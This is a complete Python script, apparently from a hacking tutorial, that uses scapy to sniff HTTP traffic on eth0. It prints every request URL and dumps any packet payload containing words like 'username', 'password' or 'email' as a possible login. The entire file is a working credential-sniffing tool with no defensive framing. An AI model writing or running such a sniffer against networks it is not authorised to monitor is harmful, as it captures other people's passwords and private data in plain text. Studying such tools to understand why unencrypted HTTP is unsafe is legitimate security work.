#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniffer(interface):
    scapy.sniff(iface = interface, store= False, prn= process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_loginInfo(packet):
    load = packet[scapy.Raw].load
    keywords = ["user", "username", "password", "pass", "email", "login"]
    for keyword in keywords:
        if keyword in str(load):
            return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("\n\n[+] HTTP Request >>>>  "+url)

        if packet.haslayer(scapy.Raw):
            login_info = get_loginInfo(packet)
            if login_info:
                print("\n\n******************Possible Login attempt******************")
                print("**********************************************************")
                print("**********************************************************")
                print(login_info)
                print("**********************************************************")
                print("**********************************************************")



sniffer("eth0")